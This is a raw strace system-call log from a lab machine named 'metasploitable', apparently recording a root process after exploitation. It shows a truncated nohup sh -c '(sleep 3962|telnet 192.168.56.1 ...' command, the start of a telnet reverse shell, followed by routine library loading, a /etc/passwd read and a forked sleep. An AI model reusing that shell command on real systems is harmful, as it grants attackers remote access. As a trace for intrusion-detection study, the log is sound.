+[pid  6364] 22:01:44.789360 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.789380 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6364] 22:01:44.789440 execve("/usr/bin/nohup", ["nohup", "sh", "-c", "(sleep 3962|telnet 192.168.56.1 "...], [/* 15 vars */]) = 0
+[pid  6364] 22:01:44.789559 brk(0)      = 0x804f000
+[pid  6364] 22:01:44.789586 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.789606 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb4000
+[pid  6364] 22:01:44.789623 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.789647 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6364] 22:01:44.789663 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6364] 22:01:44.789696 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fac000
+[pid  6364] 22:01:44.789707 close(3)    = 0
+[pid  6364] 22:01:44.789720 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.789743 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6364] 22:01:44.789762 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6364] 22:01:44.789786 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6364] 22:01:44.789821 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e5d000
+[pid  6364] 22:01:44.789835 mmap2(0xb7fa6000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7fa6000
+[pid  6364] 22:01:44.789853 mmap2(0xb7fa9000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fa9000
+[pid  6364] 22:01:44.789870 close(3)    = 0
+[pid  6364] 22:01:44.789889 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e5c000
+[pid  6364] 22:01:44.789902 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e5c6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6364] 22:01:44.789964 mprotect(0xb7fa6000, 4096, PROT_READ) = 0
+[pid  6364] 22:01:44.789980 munmap(0xb7fac000, 29338) = 0
+[pid  6364] 22:01:44.790060 brk(0)      = 0x804f000
+[pid  6364] 22:01:44.790071 brk(0x8070000) = 0x8070000
+[pid  6364] 22:01:44.790097 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf963588) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  6364] 22:01:44.790109 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf963588) = -1 EINVAL (Invalid argument)
+[pid  6364] 22:01:44.790121 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf963588) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  6364] 22:01:44.790135 rt_sigaction(SIGHUP, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.790159 execve("/sbin/sh", ["sh", "-c", "(sleep 3962|telnet 192.168.56.1 "...], [/* 15 vars */]) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790231 execve("/bin/sh", ["sh", "-c", "(sleep 3962|telnet 192.168.56.1 "...], [/* 15 vars */]) = 0
+[pid  6364] 22:01:44.790354 brk(0)      = 0x80f9000
+[pid  6364] 22:01:44.790393 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790412 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb4000
+[pid  6364] 22:01:44.790441 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790465 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6364] 22:01:44.790481 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6364] 22:01:44.790514 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fac000
+[pid  6364] 22:01:44.790525 close(3)    = 0
+[pid  6364] 22:01:44.790538 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790561 open("/lib/libncurses.so.5", O_RDONLY) = 3
+[pid  6364] 22:01:44.790579 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  6364] 22:01:44.790603 fstat64(3, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  6364] 22:01:44.790636 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7f7c000
+[pid  6364] 22:01:44.790649 mmap2(0xb7fa9000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c) = 0xb7fa9000
+[pid  6364] 22:01:44.790670 close(3)    = 0
+[pid  6364] 22:01:44.790683 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790702 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 3
+[pid  6364] 22:01:44.790722 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  6364] 22:01:44.790744 fstat64(3, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  6364] 22:01:44.790777 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7f78000
+[pid  6364] 22:01:44.790789 mmap2(0xb7f7a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0xb7f7a000
+[pid  6364] 22:01:44.790808 close(3)    = 0
+[pid  6364] 22:01:44.790820 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.790837 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6364] 22:01:44.790856 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6364] 22:01:44.790878 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6364] 22:01:44.790910 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f77000
+[pid  6364] 22:01:44.790926 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e28000
+[pid  6364] 22:01:44.790938 mmap2(0xb7f71000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7f71000
+[pid  6364] 22:01:44.790954 mmap2(0xb7f74000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f74000
+[pid  6364] 22:01:44.791220 close(3)    = 0
+[pid  6364] 22:01:44.791250 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e27000
+[pid  6364] 22:01:44.791274 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e276b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6364] 22:01:44.791383 mprotect(0xb7f71000, 4096, PROT_READ) = 0
+[pid  6364] 22:01:44.791433 munmap(0xb7fac000, 29338) = 0
+[pid  6364] 22:01:44.791472 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.791490 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  6364] 22:01:44.791518 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf963390) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  6364] 22:01:44.791556 brk(0)      = 0x80f9000
+[pid  6364] 22:01:44.791566 brk(0x80fa000) = 0x80fa000
+[pid  6364] 22:01:44.791584 brk(0x80fb000) = 0x80fb000
+[pid  6364] 22:01:44.791608 getuid32()  = 0
+[pid  6364] 22:01:44.791619 getgid32()  = 0
+[pid  6364] 22:01:44.791629 geteuid32() = 0
+[pid  6364] 22:01:44.791639 getegid32() = 0
+[pid  6364] 22:01:44.791657 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.791676 time(NULL)  = 1478487704
+[pid  6364] 22:01:44.791693 brk(0x80fc000) = 0x80fc000
+[pid  6364] 22:01:44.791712 brk(0x80fd000) = 0x80fd000
+[pid  6364] 22:01:44.791740 open("/proc/meminfo", O_RDONLY) = 3
+[pid  6364] 22:01:44.791771 fstat64(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  6364] 22:01:44.791806 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb3000
+[pid  6364] 22:01:44.791820 read(3, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  6364] 22:01:44.791872 close(3)    = 0
+[pid  6364] 22:01:44.791884 munmap(0xb7fb3000, 4096) = 0
+[pid  6364] 22:01:44.791897 brk(0x80fe000) = 0x80fe000
+[pid  6364] 22:01:44.791929 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.791949 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.791969 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.791988 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.792008 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.792027 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.792049 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.792064 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.792085 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  6364] 22:01:44.792202 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6364] 22:01:44.792256 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6364] 22:01:44.792303 getpid()    = 6364
+[pid  6364] 22:01:44.792322 getppid()   = 6363
+[pid  6364] 22:01:44.792342 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6364] 22:01:44.792380 stat64("/sbin/sh", 0xbf963368) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.792396 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6364] 22:01:44.792432 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6364] 22:01:44.792481 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6364] 22:01:44.792497 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6364] 22:01:44.792513 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.792556 close(3)    = 0
+[pid  6364] 22:01:44.792571 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6364] 22:01:44.792582 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6364] 22:01:44.792595 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.792633 close(3)    = 0
+[pid  6364] 22:01:44.792650 open("/etc/nsswitch.conf", O_RDONLY) = 3
+[pid  6364] 22:01:44.792670 fstat64(3, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  6364] 22:01:44.792703 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb3000
+[pid  6364] 22:01:44.792715 read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  6364] 22:01:44.792741 read(3, "", 4096) = 0
+[pid  6364] 22:01:44.792751 close(3)    = 0
+[pid  6364] 22:01:44.792762 munmap(0xb7fb3000, 4096) = 0
+[pid  6364] 22:01:44.792782 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6364] 22:01:44.792799 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6364] 22:01:44.792831 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fac000
+[pid  6364] 22:01:44.792843 close(3)    = 0
+[pid  6364] 22:01:44.792856 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.792878 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 3
+[pid  6364] 22:01:44.792902 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  6364] 22:01:44.792925 fstat64(3, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  6364] 22:01:44.792959 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e1e000
+[pid  6364] 22:01:44.792971 mmap2(0xb7e25000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6) = 0xb7e25000
+[pid  6364] 22:01:44.792992 close(3)    = 0
+[pid  6364] 22:01:44.793006 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.793023 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 3
+[pid  6364] 22:01:44.793044 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  6364] 22:01:44.793066 fstat64(3, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  6364] 22:01:44.793099 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e06000
+[pid  6364] 22:01:44.793111 mmap2(0xb7e1a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13) = 0xb7e1a000
+[pid  6364] 22:01:44.793129 mmap2(0xb7e1c000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e1c000
+[pid  6364] 22:01:44.793146 close(3)    = 0
+[pid  6364] 22:01:44.793179 munmap(0xb7fac000, 29338) = 0
+[pid  6364] 22:01:44.793199 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6364] 22:01:44.793216 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6364] 22:01:44.793248 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fac000
+[pid  6364] 22:01:44.793259 close(3)    = 0
+[pid  6364] 22:01:44.793272 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.793294 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 3
+[pid  6364] 22:01:44.793316 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  6364] 22:01:44.793338 fstat64(3, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  6364] 22:01:44.793370 brk(0x80ff000) = 0x80ff000
+[pid  6364] 22:01:44.793384 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7dfc000
+[pid  6364] 22:01:44.793397 mmap2(0xb7e04000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7) = 0xb7e04000
+[pid  6364] 22:01:44.793417 close(3)    = 0
+[pid  6364] 22:01:44.793433 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.793450 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 3
+[pid  6364] 22:01:44.793472 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  6364] 22:01:44.793494 fstat64(3, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  6364] 22:01:44.793527 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7df1000
+[pid  6364] 22:01:44.793539 mmap2(0xb7dfa000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x8) = 0xb7dfa000
+[pid  6364] 22:01:44.793560 close(3)    = 0
+[pid  6364] 22:01:44.793585 munmap(0xb7fac000, 29338) = 0
+[pid  6364] 22:01:44.793603 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 3
+[pid  6364] 22:01:44.793620 fcntl64(3, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  6364] 22:01:44.793633 _llseek(3, 0, [0], SEEK_CUR) = 0
+[pid  6364] 22:01:44.793647 fstat64(3, {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  6364] 22:01:44.793679 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 3, 0) = 0xb7fb3000
+[pid  6364] 22:01:44.793692 _llseek(3, 1581, [1581], SEEK_SET) = 0
+[pid  6364] 22:01:44.793711 munmap(0xb7fb3000, 1581) = 0
+[pid  6364] 22:01:44.793722 close(3)    = 0
+[pid  6364] 22:01:44.793751 brk(0x8100000) = 0x8100000
+[pid  6364] 22:01:44.793771 getpgrp()   = 4409
+[pid  6364] 22:01:44.793781 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.793804 getrlimit(RLIMIT_NPROC, {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  6364] 22:01:44.793829 brk(0x8101000) = 0x8101000
+[pid  6364] 22:01:44.793856 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.793873 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.793890 brk(0x8102000) = 0x8102000
+[pid  6364] 22:01:44.793906 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.793972 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6364] 22:01:44.793994 clone(Process 6365 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6365
+[pid  6365] 22:01:44.794064 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6365] 22:01:44.794085 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794106 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794126 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794164 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794187 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  6365] 22:01:44.794207 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6365] 22:01:44.794228 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794248 rt_sigaction(SIGINT, {0x8091fd0, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6365] 22:01:44.794271 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6365] 22:01:44.794289 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6365] 22:01:44.794314 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6365] 22:01:44.794358 pipe([3, 4]) = 0
+[pid  6365] 22:01:44.794391 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6365] 22:01:44.794408 clone(Process 6366 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6366
+[pid  6366] 22:01:44.794471 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6366] 22:01:44.794490 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794510 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794530 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794589 close(3)    = 0
+[pid  6366] 22:01:44.794609 dup2(4, 1)  = 1
+[pid  6366] 22:01:44.794620 close(4)    = 0
+[pid  6366] 22:01:44.794686 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6366] 22:01:44.794724 stat64("/sbin/sleep", 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.794740 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+[pid  6366] 22:01:44.794777 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+[pid  6366] 22:01:44.794825 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  6366] 22:01:44.794847 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794867 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6366] 22:01:44.794888 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794908 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6366] 22:01:44.794936 execve("/bin/sleep", ["sleep", "3962"], [/* 15 vars */]) = 0
+[pid  6366] 22:01:44.795045 brk(0)      = 0x804f000
+[pid  6366] 22:01:44.795073 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.795092 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0b000
+[pid  6366] 22:01:44.795110 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.795132 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6366] 22:01:44.795149 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6366] 22:01:44.795182 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7f03000
+[pid  6366] 22:01:44.795193 close(3)    = 0
+[pid  6366] 22:01:44.795206 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.795231 open("/lib/tls/i686/cmov/librt.so.1", O_RDONLY) = 3
+[pid  6366] 22:01:44.795251 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\31"..., 512) = 512
+[pid  6366] 22:01:44.795276 fstat64(3, {st_mode=S_IFREG|0644, st_size=30624, ...}) = 0
+[pid  6366] 22:01:44.795310 mmap2(NULL, 33360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7efa000
+[pid  6366] 22:01:44.795324 mmap2(0xb7f01000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6) = 0xb7f01000
+[pid  6366] 22:01:44.795345 close(3)    = 0
+[pid  6366] 22:01:44.795358 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.795378 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6366] 22:01:44.795398 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6366] 22:01:44.795420 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6366] 22:01:44.795455 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7dab000
+[pid  6366] 22:01:44.795467 mmap2(0xb7ef4000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7ef4000
+[pid  6366] 22:01:44.795485 mmap2(0xb7ef7000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ef7000
+[pid  6366] 22:01:44.795501 close(3)    = 0
+[pid  6366] 22:01:44.795516 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6366] 22:01:44.795534 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 3
+[pid  6366] 22:01:44.795556 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\000"..., 512) = 512
+[pid  6366] 22:01:44.795579 fstat64(3, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
+[pid  6366] 22:01:44.795612 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7daa000
+[pid  6366] 22:01:44.795628 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d92000
+[pid  6366] 22:01:44.795640 mmap2(0xb7da6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13) = 0xb7da6000
+[pid  6366] 22:01:44.795657 mmap2(0xb7da8000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7da8000
+[pid  6366] 22:01:44.795674 close(3)    = 0
+[pid  6366] 22:01:44.795699 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d91000
+[pid  6366] 22:01:44.795713 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d916b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6366] 22:01:44.795786 mprotect(0xb7ef4000, 4096, PROT_READ) = 0
+[pid  6366] 22:01:44.795805 munmap(0xb7f03000, 29338) = 0
+[pid  6366] 22:01:44.795820 set_tid_address(0xb7d916f8) = 6366
+[pid  6366] 22:01:44.795830 set_robust_list(0xb7d91700, 0xc) = 0
+[pid  6366] 22:01:44.795841 futex(0xbfd78af0, 0x81 /* FUTEX_??? */, 1) = 0
+[pid  6366] 22:01:44.795859 rt_sigaction(SIGRTMIN, {0xb7d962c0, [], SA_SIGINFO}, NULL, 8) = 0
+[pid  6366] 22:01:44.795876 rt_sigaction(SIGRT_1, {0xb7d96340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
